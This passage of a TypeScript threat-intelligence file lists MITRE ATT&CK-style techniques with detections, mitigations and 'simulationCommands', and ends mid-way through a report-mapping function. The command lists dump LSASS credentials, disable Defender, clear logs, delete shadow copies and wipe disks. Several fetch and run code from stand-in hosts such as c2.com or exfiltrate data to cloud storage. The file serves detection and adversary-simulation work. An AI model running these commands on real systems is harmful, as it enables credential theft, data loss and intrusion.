        description: "Exploiting local kernel or service vulnerabilities to escalate from normal user to SYSTEM or root.",
        platforms: ["Windows", "Linux"],
        mitigations: ["Kernel Patching", "Disable vulnerable drivers"],
        detections: ["Spikes in kernel crash dumps or abnormal token generation"],
        threatActors: ["Sandworm", "Volt Typhoon"],
        malware: ["DirtyPipe", "Win32k LPE"],
        simulationCommands: ["./dirtypipe /etc/passwd", "win32k_exploit.exe"],
        detectionKeywords: ["kernel exploit", "local privilege escalation", "dirtycow", "dirtypipe", "cve-202"],
        subTechniques: [],
      },
    ],
  },

  // 7. STEALTH (TA0005.1)
  {
    id: "TA0005.1",
    name: "Stealth",
    shortName: "Stealth",
    description: "Techniques adversaries use to operate covertly, masquerade, and blend with legitimate system behaviors.",
    order: 7,
    techniques: [
      {
        id: "T1027",
        name: "Obfuscated Files or Information",
        tacticId: "TA0005.1",
        tacticName: "Stealth",
        description: "Encoding commands, using Base64, packing binaries, or encrypting payload strings to evade static AV.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Behavioral Endpoint Monitoring", "AMSI Inspection"],
        detections: ["High entropy file writes in temp directories"],
        threatActors: ["Qakbot", "Bumblebee", "FIN7"],
        malware: ["Custom Packers"],
        simulationCommands: [
          "certutil.exe -decode encoded_stage.txt stage.exe",
          "powershell.exe -enc JABhAD0...",
        ],
        detectionKeywords: ["base64 encoded", "obfuscation", "xor encryption", "certutil -decode", "packed binary"],
        subTechniques: [
          { id: "T1027.001", name: "Binary Padding", description: "Inflating binary sizes beyond sandbox limits.", platforms: ["Windows"] },
          { id: "T1027.002", name: "Software Packing", description: "Compressing executables with UPX or custom crypters.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1218",
        name: "System Binary Proxy Execution (LOLBAS)",
        tacticId: "TA0005.1",
        tacticName: "Stealth",
        description: "Executing malicious code using legitimate signed Windows utilities (rundll32, mshta, regsvr32).",
        platforms: ["Windows"],
        mitigations: ["WDAC / AppLocker Execution Policies"],
        detections: ["Rundll32 or Mshta making outbound network connections"],
        threatActors: ["Volt Typhoon", "FIN7", "APT29"],
        malware: ["LOLBAS Utilities"],
        simulationCommands: [
          "rundll32.exe C:\\Windows\\Temp\\loader.dll,StartRoutine",
          "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:http://c2.com/test.sct\"\")\"))",
        ],
        detectionKeywords: ["rundll32", "mshta", "regsvr32", "certutil", "bitsadmin", "lolbas"],
        subTechniques: [
          { id: "T1218.005", name: "Mshta", description: "Executing remote HTA scripts.", platforms: ["Windows"] },
          { id: "T1218.010", name: "Regsvr32", description: "Executing Squiblydoo scriptlet payloads.", platforms: ["Windows"] },
          { id: "T1218.011", name: "Rundll32", description: "Invoking arbitrary exported DLL routines.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1036",
        name: "Masquerading",
        tacticId: "TA0005.1",
        tacticName: "Stealth",
        description: "Renaming malicious binaries to mimic legitimate system processes (svchost.exe, csrss.exe).",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Verify Digital Signatures", "Process Path Auditing"],
        detections: ["svchost.exe executing from C:\\Users\\... or AppData instead of System32"],
        threatActors: ["Akira", "Black Basta"],
        malware: ["Mimikatz disguised as svchost"],
        simulationCommands: ["copy payload.exe C:\\Windows\\Temp\\svchost.exe"],
        detectionKeywords: ["masquerading", "fake svchost", "spoofed extension", "lookalike filename"],
        subTechniques: [
          { id: "T1036.005", name: "Match Legitimate Name", description: "Naming malware identical to core Windows services.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1140",
        name: "Deobfuscate/Decode Files or Information",
        tacticId: "TA0005.1",
        tacticName: "Stealth",
        description: "Adversaries use deobfuscation to convert payloads from an encoded or encrypted state into executable code.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["AMSI Script Content Auditing"],
        detections: ["Certutil -decode or openssl enc -d commands in process trees"],
        threatActors: ["Qakbot", "Emotet"],
        malware: ["Bumblebee"],
        simulationCommands: ["certutil -decode stage.b64 stage.dll"],
        detectionKeywords: ["deobfuscate", "certutil -decode", "xor decrypt", "base64 decode"],
        subTechniques: [],
      },
    ],
  },

  // 8. DEFENSE IMPAIRMENT (TA0005.2)
  {
    id: "TA0005.2",
    name: "Defense Impairment",
    shortName: "Defense Impairment",
    description: "Techniques adversaries use to disable security software, tamper with EDR sensors, and blind defenders.",
    order: 8,
    techniques: [
      {
        id: "T1562",
        name: "Impair Defenses",
        tacticId: "TA0005.2",
        tacticName: "Defense Impairment",
        description: "Disabling antivirus, tampering with EDR agents, or removing event logging sensors.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Tamper Protection", "MFA on Security Agent Uninstalls"],
        detections: ["sc stop WinDefend or Set-MpPreference -DisableRealtimeMonitoring"],
        threatActors: ["Black Basta", "LockBit", "Akira"],
        malware: ["EDR Killers", "AuKill"],
        simulationCommands: [
          "sc.exe stop WinDefend",
          "powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true",
          "fltmc.exe unload sentinel",
        ],
        detectionKeywords: ["disable antivirus", "windefend", "impair defenses", "blind edr", "byovd", "tamper edr"],
        subTechniques: [
          { id: "T1562.001", name: "Disable or Modify Tools", description: "Killing EDR processes or unloading drivers.", platforms: ["Windows", "Linux"] },
          { id: "T1562.002", name: "Disable Windows Event Logging", description: "Suspending the eventlog service threads.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1070",
        name: "Indicator Removal",
        tacticId: "TA0005.2",
        tacticName: "Defense Impairment",
        description: "Clearing Windows Event Logs, deleting bash histories, and scrubbing forensic artifacts.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Forward Logs to Remote SIEM Immediately"],
        detections: ["Security Event ID 1102 (The audit log was cleared)"],
        threatActors: ["Volt Typhoon", "Akira"],
        malware: ["Wevtutil Commands"],
        simulationCommands: [
          "wevtutil.exe cl Security && wevtutil.exe cl System",
          "history -c && rm -f ~/.bash_history",
        ],
        detectionKeywords: ["wevtutil", "clear event log", "wevtutil cl", "indicator removal", "event log clear"],
        subTechniques: [
          { id: "T1070.001", name: "Clear Windows Event Logs", description: "Running wevtutil cl commands.", platforms: ["Windows"] },
          { id: "T1070.003", name: "Clear Command History", description: "Erasing history files.", platforms: ["Linux", "macOS"] },
          { id: "T1070.004", name: "File Deletion", description: "Deleting staged tools with sdelete or del.", platforms: ["Windows", "Linux"] },
        ],
      },
      {
        id: "T1553",
        name: "Subvert Trust Controls (BYOVD)",
        tacticId: "TA0005.2",
        tacticName: "Defense Impairment",
        description: "Abusing signed vulnerable drivers to gain arbitrary kernel write and disable EDR sensors.",
        platforms: ["Windows"],
        mitigations: ["Microsoft Vulnerable Driver Blocklist", "HVCI / Virtualization Based Security"],
        detections: ["Driver loading events for known vulnerable hashes (gdrv.sys, mhyprot2.sys)"],
        threatActors: ["Black Basta", "Akira", "Scattered Spider"],
        malware: ["POORTRY", "STONESTOP", "AuKill"],
        simulationCommands: [
          "sc.exe create vuln_driver binPath= 'C:\\Windows\\System32\\drivers\\gdrv.sys' type= kernel",
        ],
        detectionKeywords: ["byovd", "vulnerable driver", "kernel callback", "unhooking", "direct syscall", "amsi patch"],
        subTechniques: [
          { id: "T1553.006", name: "Code Signing Policy Modification", description: "Bypassing driver signature enforcement.", platforms: ["Windows"] },
        ],
      },
    ],
  },

  // 9. CREDENTIAL ACCESS (TA0006)
  {
    id: "TA0006",
    name: "Credential Access",
    shortName: "Cred Access",
    description: "The adversary is trying to steal credentials like passwords and tokens.",
    order: 9,
    techniques: [
      {
        id: "T1003",
        name: "OS Credential Dumping",
        tacticId: "TA0006",
        tacticName: "Credential Access",
        description: "Extracting password hashes, Kerberos tickets, or plain text from LSASS, SAM, or NTDS.dit.",
        platforms: ["Windows"],
        mitigations: ["Enable LSA Protection (RunAsPPL)", "Credential Guard"],
        detections: ["Non-system process opening handle to lsass.exe with PROCESS_VM_READ access rights"],
        threatActors: ["Volt Typhoon", "Akira", "LockBit", "BlackCat"],
        malware: ["Mimikatz", "ProcDump", "NanoDump"],
        simulationCommands: [
          "procdump.exe -ma lsass.exe C:\\Users\\Public\\lsass.dmp",
          "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
          "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
        ],
        detectionKeywords: ["lsass", "procdump", "mimikatz", "sam dump", "ntds.dit", "credential dumping"],
        subTechniques: [
          { id: "T1003.001", name: "LSASS Memory", description: "Dumping process memory of lsass.exe.", platforms: ["Windows"] },
          { id: "T1003.002", name: "Security Account Manager", description: "Extracting local hashes from HKLM\\SAM.", platforms: ["Windows"] },
          { id: "T1003.003", name: "NTDS", description: "Extracting domain database via vssadmin or ntdsutil.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1110",
        name: "Brute Force (Password Spray)",
        tacticId: "TA0006",
        tacticName: "Credential Access",
        description: "Attempting many passwords against one account or one password across many accounts.",
        platforms: ["Windows", "Linux", "Cloud", "Identity"],
        mitigations: ["Account Lockout Policies", "Smart Lockout", "MFA"],
        detections: ["Spikes in Event ID 4625 (Logon failure) across multiple usernames"],
        threatActors: ["Midnight Blizzard", "APT28"],
        malware: ["Hydra", "Spray"],
        simulationCommands: ["hydra -L users.txt -p 'Summer2026!' target-rdp rdp"],
        detectionKeywords: ["password spray", "brute force", "failed logon spike", "eventid 4625"],
        subTechniques: [
          { id: "T1110.003", name: "Password Spraying", description: "Testing single common password across many users.", platforms: ["Cloud", "Identity"] },
        ],
      },
      {
        id: "T1558",
        name: "Steal or Forge Kerberos Tickets",
        tacticId: "TA0006",
        tacticName: "Credential Access",
        description: "Requesting service tickets (TGS) for SPNs and cracking them offline to reveal service passwords (Kerberoasting).",
        platforms: ["Windows"],
        mitigations: ["Use Group Managed Service Accounts (gMSA) with 128-bit passwords"],
        detections: ["Event ID 4769 with encryption type 0x17 (RC4) requested for non-standard SPNs"],
        threatActors: ["FIN7", "Black Basta"],
        malware: ["Rubeus", "Kerbrute"],
        simulationCommands: [
          "Rubeus.exe kerberoast /outfile:hashes.kerberoast",
          "powershell.exe -c Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"}",
        ],
        detectionKeywords: ["kerberoast", "rubeus", "golden ticket", "silver ticket", "tgs request"],
        subTechniques: [
          { id: "T1558.003", name: "Kerberoasting", description: "Requesting TGS tickets to crack RC4/AES offline.", platforms: ["Windows"] },
          { id: "T1558.001", name: "Golden Ticket", description: "Forging TGT tickets using the KRBTGT NTLM hash.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1528",
        name: "Steal Application Access Token",
        tacticId: "TA0006",
        tacticName: "Credential Access",
        description: "Extracting OAuth tokens, Primary Refresh Tokens (PRT), or cloud session keys.",
        platforms: ["Cloud", "Identity"],
        mitigations: ["Continuous Access Evaluation", "Device Bound Tokens"],
        detections: ["Token replay from foreign IP addresses without interactive MFA prompt"],
        threatActors: ["Midnight Blizzard", "Lapsus$", "Scattered Spider"],
        malware: ["ROADtools", "AADInternals"],
        simulationCommands: [
          "python3 roadrecon.py auth --prt-cookie <cookie>",
        ],
        detectionKeywords: ["prt token", "entra id token", "aadrefreshtoken", "cloud token theft", "oauth token"],
        subTechniques: [],
      },
    ],
  },

  // 10. DISCOVERY (TA0007)
  {
    id: "TA0007",
    name: "Discovery",
    shortName: "Discovery",
    description: "The adversary is trying to observe and orient within your environment.",
    order: 10,
    techniques: [
      {
        id: "T1087",
        name: "Account Discovery",
        tacticId: "TA0007",
        tacticName: "Discovery",
        description: "Enumerating local and domain user accounts, groups, and administrative privileges.",
        platforms: ["Windows", "Linux", "macOS", "Cloud"],
        mitigations: ["Restrict LDAP Queries", "Least Privilege"],
        detections: ["Rapid invocation of net user, net group, or AdFind LDAP search filters"],
        threatActors: ["Volt Typhoon", "Akira", "LockBit"],
        malware: ["AdFind", "BloodHound"],
        simulationCommands: [
          "net user /domain",
          "net group \"Domain Admins\" /domain",
        ],
        detectionKeywords: ["net user", "domain admins", "account discovery", "get-aduser", "adfind"],
        subTechniques: [
          { id: "T1087.001", name: "Local Account", description: "Listing accounts via net user or /etc/passwd.", platforms: ["Windows", "Linux"] },
          { id: "T1087.002", name: "Domain Account", description: "Listing Active Directory domain accounts.", platforms: ["Windows"] },
        ],
      },
      {
        id: "T1082",
        name: "System Information Discovery",
        tacticId: "TA0007",
        tacticName: "Discovery",
        description: "Querying OS details, hostname, architecture, and patch level.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Command Line Auditing"],
        detections: ["Execution of systeminfo, uname -a, or hostname by non-admin users"],
        threatActors: ["Volt Typhoon", "Black Basta"],
        malware: ["Builtin Utilities"],
        simulationCommands: ["systeminfo", "uname -a"],
        detectionKeywords: ["systeminfo", "os version discovery", "hostname discovery"],
        subTechniques: [],
      },
      {
        id: "T1016",
        name: "System Network Configuration Discovery",
        tacticId: "TA0007",
        tacticName: "Discovery",
        description: "Enumerating IP addresses, routing tables, DNS servers, and network adapters.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Command Line Auditing"],
        detections: ["ipconfig /all, route print, or arp -a executed in rapid sequence"],
        threatActors: ["Volt Typhoon", "Sandworm"],
        malware: ["Builtin Utilities"],
        simulationCommands: ["ipconfig /all", "route print", "arp -a"],
        detectionKeywords: ["ipconfig", "arp -a", "route print", "network configuration discovery"],
        subTechniques: [],
      },
      {
        id: "T1482",
        name: "Domain Trust Discovery",
        tacticId: "TA0007",
        tacticName: "Discovery",
        description: "Enumerating Active Directory trust relationships to locate paths into parent domains.",
        platforms: ["Windows"],
        mitigations: ["Active Directory Hardening"],
        detections: ["nltest /domain_trusts or nltest /dclist: executed from workstation"],
        threatActors: ["Black Basta", "Akira", "FIN7"],
        malware: ["Nltest", "BloodHound"],
        simulationCommands: ["nltest /domain_trusts", "nltest /dclist:"],
        detectionKeywords: ["nltest", "domain_trusts", "dclist", "domain trust discovery"],
        subTechniques: [],
      },
      {
        id: "T1057",
        name: "Process Discovery",
        tacticId: "TA0007",
        tacticName: "Discovery",
        description: "Listing running processes to identify security agents and virtualized sandbox environments.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Process Auditing"],
        detections: ["tasklist /v or ps aux executed immediately following initial access"],
        threatActors: ["Akira", "LockBit"],
        malware: ["Builtin Utilities"],
        simulationCommands: ["tasklist /v", "ps aux"],
        detectionKeywords: ["tasklist", "ps aux", "process discovery", "get-process"],
        subTechniques: [],
      },
    ],
  },

  // 11. LATERAL MOVEMENT (TA0008)
  {
    id: "TA0008",
    name: "Lateral Movement",
    shortName: "Lateral Move",
    description: "The adversary is trying to move through your environment.",
    order: 11,
    techniques: [
      {
        id: "T1021",
        name: "Remote Services (RDP & SMB)",
        tacticId: "TA0008",
        tacticName: "Lateral Movement",
        description: "Using Remote Desktop Protocol (RDP), SMB administrative shares (C$, ADMIN$), or SSH to pivot.",
        platforms: ["Windows", "Linux"],
        mitigations: ["Block Workstation-to-Workstation SMB and RDP", "Local Admin Password Solution (LAPS)"],
        detections: ["SMB file copies into ADMIN$ or C$\\Windows\\Temp from workstations"],
        threatActors: ["Volt Typhoon", "Akira", "Black Basta"],
        malware: ["PsExec", "Impacket"],
        simulationCommands: [
          "psexec.exe \\\\192.168.1.50 -u DOMAIN\\admin -p P@ss cmd.exe",
          "mstsc.exe /v:192.168.1.50",
        ],
        detectionKeywords: ["psexec", "smb share", "admin$", "c$", "remote desktop", "rdp lateral"],
        subTechniques: [
          { id: "T1021.001", name: "Remote Desktop Protocol", description: "Opening interactive GUI sessions with mstsc.", platforms: ["Windows"] },
          { id: "T1021.002", name: "SMB/Windows Admin Shares", description: "Accessing ADMIN$ or C$ via net use.", platforms: ["Windows"] },
          { id: "T1021.004", name: "SSH", description: "SSHing between Linux/Unix hosts using stolen keys.", platforms: ["Linux", "macOS"] },
        ],
      },
      {
        id: "T1570",
        name: "Lateral Tool Transfer",
        tacticId: "TA0008",
        tacticName: "Lateral Movement",
        description: "Transferring tools and payloads between internal systems across network shares.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Internal Network Segmentation"],
        detections: ["File creation of executables on remote file shares"],
        threatActors: ["Black Basta", "Akira"],
        malware: ["Impacket", "Robocopy"],
        simulationCommands: ["copy C:\\Windows\\Temp\\loader.exe \\\\192.168.1.50\\C$\\Windows\\Temp\\"],
        detectionKeywords: ["lateral tool transfer", "copy to c$", "internal file copy", "stage payload internally"],
        subTechniques: [],
      },
      {
        id: "T1550",
        name: "Use Alternate Authentication Material",
        tacticId: "TA0008",
        tacticName: "Lateral Movement",
        description: "Authenticating using NTLM hashes or Kerberos tickets without cracking the password (Pass the Hash / Overpass the Hash).",
        platforms: ["Windows"],
        mitigations: ["Disable NTLM", "Protected Users Group"],
        detections: ["Logon Type 3 with NTLM authentication for domain admin accounts"],
        threatActors: ["FIN7", "Volt Typhoon"],
        malware: ["Mimikatz", "Wmiexec"],
        simulationCommands: ["mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:CORP /ntlm:b4b9b02e6f0...\""],
        detectionKeywords: ["pass the hash", "pth", "overpass the hash", "ntlm hash replay"],
        subTechniques: [
          { id: "T1550.002", name: "Pass the Hash", description: "Replaying NTLM hashes across SMB/WMI.", platforms: ["Windows"] },
          { id: "T1550.003", name: "Pass the Ticket", description: "Injecting forged Kerberos TGS or TGT tickets.", platforms: ["Windows"] },
        ],
      },
    ],
  },

  // 12. COLLECTION (TA0009)
  {
    id: "TA0009",
    name: "Collection",
    shortName: "Collection",
    description: "The adversary is trying to gather data of interest to their goal.",
    order: 12,
    techniques: [
      {
        id: "T1560",
        name: "Archive Collected Data",
        tacticId: "TA0009",
        tacticName: "Collection",
        description: "Compressing and encrypting sensitive files with 7-Zip, WinRAR, or tar prior to exfiltration.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Endpoint Data Loss Prevention (DLP)"],
        detections: ["7z.exe, rar.exe, or tar.exe spawned from command line with -p password flags"],
        threatActors: ["Akira", "BlackCat", "LockBit"],
        malware: ["7-Zip", "WinRAR"],
        simulationCommands: [
          "7z.exe a -pSecret123! C:\\Windows\\Temp\\exfil.7z C:\\Users\\*\\Documents\\*",
        ],
        detectionKeywords: ["7z a -p", "winrar a", "archive collected data", "exfil.7z", "exfil.zip"],
        subTechniques: [
          { id: "T1560.001", name: "Archive via Utility", description: "Compressing with 7-Zip, WinRAR, or tar.", platforms: ["Windows", "Linux"] },
        ],
      },
      {
        id: "T1005",
        name: "Data from Local System",
        tacticId: "TA0009",
        tacticName: "Collection",
        subTechniques: [],
      },
      {
        id: "T1039",
        name: "Data from Network Shared Drive",
        tacticId: "TA0009",
        tacticName: "Collection",
        description: "Harvesting sensitive files from enterprise network shares and file servers.",
        platforms: ["Windows"],
        mitigations: ["Share Permissions Auditing"],
        detections: ["High volume SMB read events on critical file servers"],
        threatActors: ["Volt Typhoon", "Akira"],
        malware: ["Robocopy Scripts"],
        simulationCommands: ["robocopy \\\\fileserver\\finance C:\\Staging *.pdf /s"],
        detectionKeywords: ["network share collection", "shared drive", "robocopy exfil", "file server harvest"],
        subTechniques: [],
      },
    ],
  },

  // 12. COMMAND AND CONTROL (TA0011)
  {
    id: "TA0011",
    name: "Command and Control",
    shortName: "C2",
    description: "The adversary is trying to communicate with compromised systems to control them.",
    order: 12,
    techniques: [
      {
        id: "T1071",
        name: "Application Layer Protocol",
        tacticId: "TA0011",
        tacticName: "Command and Control",
        description: "Communicating over HTTP, HTTPS, DNS, or WebSockets to blend with regular network traffic.",
        platforms: ["Windows", "Linux", "macOS", "Network"],
        mitigations: ["SSL/TLS Decryption Inspection", "DNS Sinkholing"],
        detections: ["Periodic beaconing intervals to newly registered domains"],
        threatActors: ["Volt Typhoon", "Cobalt Strike Users", "FIN7"],
        malware: ["Cobalt Strike", "Sliver", "SystemBC"],
        simulationCommands: [
          "curl -k -H 'User-Agent: Mozilla/5.0' https://185.220.101.5:8443/beacon",
        ],
        detectionKeywords: ["c2 beacon", "https beacon", "c2 communication", "dns tunneling", "c2 traffic"],
        subTechniques: [
          { id: "T1071.001", name: "Web Protocols", description: "Beaconing over HTTP/HTTPS/WebSocket.", platforms: ["Windows", "Linux"] },
          { id: "T1071.004", name: "DNS", description: "Tunneling C2 commands inside DNS TXT or A queries.", platforms: ["Windows", "Linux"] },
        ],
      },
      {
        id: "T1105",
        name: "Ingress Tool Transfer",
        tacticId: "TA0011",
        tacticName: "Command and Control",
        description: "Downloading secondary tools, loaders, and ransomware payloads from external servers.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Proxy Allowlisting", "Block certutil or curl network egress"],
        detections: ["Certutil.exe with -urlcache or bitsadmin creating remote jobs"],
        threatActors: ["Volt Typhoon", "Akira", "Black Basta"],
        malware: ["CertUtil", "BitsAdmin", "Curl"],
        simulationCommands: [
          "certutil.exe -urlcache -split -f http://c2-stage.com/ransom.exe C:\\Windows\\Temp\\ransom.exe",
          "curl -s http://c2.com/stage.sh | bash",
        ],
        detectionKeywords: ["certutil -urlcache", "curl download", "ingress tool transfer", "download payload"],
        subTechniques: [],
      },
      {
        id: "T1572",
        name: "Protocol Tunneling",
        tacticId: "TA0011",
        tacticName: "Command and Control",
        description: "Tunneling network traffic through an existing protocol using Chisel, Ngrok, or SSH.",
        platforms: ["Windows", "Linux"],
        mitigations: ["Block Known Proxy/Tunneling Binaries"],
        detections: ["Long-lived outbound TCP connections with high throughput from temp directories"],
        threatActors: ["Volt Typhoon", "Akira"],
        malware: ["Chisel", "Ngrok", "Ligolo-ng"],
        simulationCommands: ["chisel client https://tunnel.c2.com:443 R:8080:127.0.0.1:80"],
        detectionKeywords: ["chisel", "ngrok", "reverse proxy", "protocol tunneling", "ssh tunnel"],
        subTechniques: [],
      },
      {
        id: "T1219",
        name: "Remote Access Software",
        tacticId: "TA0011",
        tacticName: "Command and Control",
        description: "Deploying legitimate commercial software (AnyDesk, TeamViewer, Quick Assist, ScreenConnect) as interactive C2.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["AppLocker Whitelisting", "Block Remote Access URLs at Gateway"],
        detections: ["AnyDesk.exe running from non-standard directory like AppData or Temp"],
        threatActors: ["Black Basta", "Scattered Spider", "Akira"],
        malware: ["AnyDesk", "ScreenConnect", "TeamViewer", "Quick Assist"],
        simulationCommands: ["AnyDesk.exe --install C:\\Program Files\\AnyDesk --start-with-win"],
        detectionKeywords: ["anydesk", "teamviewer", "screenconnect", "quick assist", "remote monitoring"],
        subTechniques: [],
      },
    ],
  },

  // 14. EXFILTRATION (TA0010)
  {
    id: "TA0010",
    name: "Exfiltration",
    shortName: "Exfil",
    description: "The adversary is trying to steal data from your network.",
    order: 14,
    techniques: [
      {
        id: "T1567",
        name: "Exfiltration Over Web Service",
        tacticId: "TA0010",
        tacticName: "Exfiltration",
        description: "Exfiltrating stolen data using Rclone or REST APIs to Mega, Dropbox, Google Drive, or AWS S3.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Block Personal Cloud Storage Services at Web Gateway"],
        detections: ["Rclone CLI flags targeting mega.nz or s3 endpoints"],
        threatActors: ["Akira", "Black Basta", "LockBit"],
        malware: ["Rclone", "MegaSync"],
        simulationCommands: [
          "rclone.exe copy C:\\Windows\\Temp\\exfil.7z mega:stolen_data --transfers=4",
        ],
        detectionKeywords: ["rclone", "mega.nz", "dropbox exfil", "s3 exfiltration", "exfiltration cloud"],
        subTechniques: [
          { id: "T1567.002", name: "Exfiltration to Cloud Storage", description: "Uploading to Mega, Box, Google Drive, or Dropbox.", platforms: ["Windows", "Linux"] },
        ],
      },
      {
        id: "T1041",
        name: "Exfiltration Over C2 Channel",
        tacticId: "TA0010",
        tacticName: "Exfiltration",
        description: "Transmitting collected data directly through established command and control channels.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Network Egress Bandwidth Caps"],
        detections: ["Abnormal spikes in C2 listener outbound data transfer"],
        threatActors: ["FIN7", "Qakbot"],
        malware: ["Cobalt Strike"],
        simulationCommands: ["post_c2_data.exe --file exfil.7z --chunk-size 102400"],
        detectionKeywords: ["exfiltration over c2", "outbound exfil", "c2 exfiltration"],
        subTechniques: [],
      },
    ],
  },

  // 15. IMPACT (TA0040)
  {
    id: "TA0040",
    name: "Impact",
    shortName: "Impact",
    description: "The adversary is trying to manipulate, interrupt, or destroy your systems and data.",
    order: 15,
    techniques: [
      {
        id: "T1486",
        name: "Data Encrypted for Impact (Ransomware)",
        tacticId: "TA0040",
        tacticName: "Impact",
        description: "Encrypting file data on local drives and shared volumes to disrupt availability and extort ransom payments.",
        platforms: ["Windows", "Linux", "macOS"],
        mitigations: ["Immutable Offline Backups", "Ransomware Canary Files"],
        detections: ["Mass file rename events appending ransomware extensions and dropping ransom notes"],
        threatActors: ["Akira", "Black Basta", "LockBit", "BlackCat"],
        malware: ["Akira Ransomware", "LockBit 3.0", "Black Basta"],
        simulationCommands: [
          "akira.exe -n -s C:\\Users\\Public",
          "blackbasta.exe --path C:\\Data",
        ],
        detectionKeywords: ["ransomware", "encrypt files", "data encrypted for impact", "ransom note", "akira", "lockbit", "black basta"],
        subTechniques: [],
      },
      {
        id: "T1490",
        name: "Inhibit System Recovery",
        tacticId: "TA0040",
        tacticName: "Impact",
        description: "Deleting volume shadow copies, disabling startup recovery, and clearing backup catalogs.",
        platforms: ["Windows", "Linux"],
        mitigations: ["Shadow Copy Access Control"],
        detections: ["vssadmin.exe delete shadows /all /quiet or bcdedit /set recoveryenabled No"],
        threatActors: ["Akira", "LockBit", "Black Basta"],
        malware: ["Vssadmin", "Bcdedit"],
        simulationCommands: [
          "vssadmin.exe delete shadows /all /quiet",
          "bcdedit.exe /set {default} recoveryenabled No",
          "wbadmin.exe delete catalog -quiet",
        ],
        detectionKeywords: ["vssadmin delete shadows", "inhibit system recovery", "shadow copies", "bcdedit recoveryenabled"],
        subTechniques: [],
      },
      {
        id: "T1489",
        name: "Service Stop",
        tacticId: "TA0040",
        tacticName: "Impact",
        description: "Stopping database, backup, or security services to facilitate encryption or cause denial of service.",
        platforms: ["Windows", "Linux"],
        mitigations: ["Protect Service Control Manager"],
        detections: ["net stop or sc stop executed against MSSQL, Exchange, or Veeam services"],
        threatActors: ["Akira", "BlackCat"],
        malware: ["Service Termination Scripts"],
        simulationCommands: ["net.exe stop MSSQLSERVER /y", "sc.exe stop veeam"],
        detectionKeywords: ["service stop", "stop mssqlserver", "kill database service", "stop backup service"],
        subTechniques: [],
      },
      {
        id: "T1485",
        name: "Data Destruction",
        tacticId: "TA0040",
        tacticName: "Impact",
        description: "Overwriting or zeroing data to render files and master boot records completely unrecoverable.",
        platforms: ["Windows", "Linux"],
        mitigations: ["Secure Boot", "Hardware-Enforced Disk Write Protection"],
        detections: ["Direct raw disk write operations bypassing filesystem drivers"],
        threatActors: ["Sandworm Team", "Lazarus Group"],
        malware: ["HermeticWiper", "CaddyWiper", "WhisperGate"],
        simulationCommands: ["dd if=/dev/zero of=/dev/sda bs=1M count=100"],
        detectionKeywords: ["wiper", "hermeticwiper", "data destruction", "disk wipe", "caddywiper"],
        subTechniques: [],
      },
    ],
  },
];

/**
 * Intelligent Mapping Engine: Matches Knowledge Base Reports to MITRE ATT&CK Matrix
 * Safe-guarded against null/undefined properties.
 */
export function mapReportsToMitreMatrix(reports: ReportListItem[]): MappedTactic[] {
  const safeReports = Array.isArray(reports) ? reports : [];

  return MITRE_TACTICS_DATA.map((tactic) => {
    let totalTacticMappedReports = 0;
    let totalSubTechs = 0;

    const rawTechniques = Array.isArray(tactic?.techniques) ? tactic.techniques : [];

    const mappedTechniques: MappedTechnique[] = rawTechniques.map((tech) => {
      const subTechs = Array.isArray(tech?.subTechniques) ? tech.subTechniques : [];
      totalSubTechs += subTechs.length;
      const matchedReports: ReportListItem[] = [];

      for (const report of safeReports) {
        if (!report) continue;
        let isMatch = false;

        // 1. Direct Technique ID match in extracted entities (safely check t.id)
        const extTechs = Array.isArray(report.extractedEntities?.techniques)
          ? report.extractedEntities.techniques
          : [];

        if (
          extTechs.some(
            (t) =>
              typeof t?.id === "string" &&
              (t.id === tech.id || t.id.startsWith(`${tech.id}.`)),
          )
        ) {
          isMatch = true;
        }

        // 2. Attack Chain steps match (safely check step & techniques)
        if (!isMatch && Array.isArray(report.analysis?.attackChain)) {
          for (const step of report.analysis.attackChain) {
            if (!step) continue;
            if (
              Array.isArray(step.techniques) &&
              step.techniques.some(
                (t) =>
                  typeof t?.id === "string" &&
                  (t.id === tech.id || t.id.startsWith(`${tech.id}.`)),
              )
            ) {
              isMatch = true;
              break;
            }
            // Match by tactic name
            if (
              typeof step.tactic === "string" &&
              step.tactic.toLowerCase() === tactic.name.toLowerCase()
            ) {
              const techNames = Array.isArray(step.techniques)
                ? step.techniques.map((t) => t?.name || "").join(" ")
                : "";
              const stepStr = `${step.tactic} ${step.step || ""} ${techNames}`.toLowerCase();
              const dKws = Array.isArray(tech?.detectionKeywords) ? tech.detectionKeywords : [];
              if (dKws.some((kw) => stepStr.includes(kw.toLowerCase()))) {
                isMatch = true;
                break;
              }
            }
          }
        }

        // 3. Execution procedures & commands match
        if (!isMatch && Array.isArray(report.extractedEntities?.procedures)) {
          const procs = report.extractedEntities.procedures.join(" ").toLowerCase();
          const dKws = Array.isArray(tech?.detectionKeywords) ? tech.detectionKeywords : [];
          if (dKws.some((kw) => procs.includes(kw.toLowerCase()))) {
            isMatch = true;
          }
        }

        // 4. Classification & keyword match in title and excerpt
        if (!isMatch) {
          const reportText = `${report.title || ""} ${report.excerpt || ""} ${report.classification || ""}`.toLowerCase();
          if (typeof tech.id === "string" && reportText.includes(tech.id.toLowerCase())) {
            isMatch = true;
          } else {
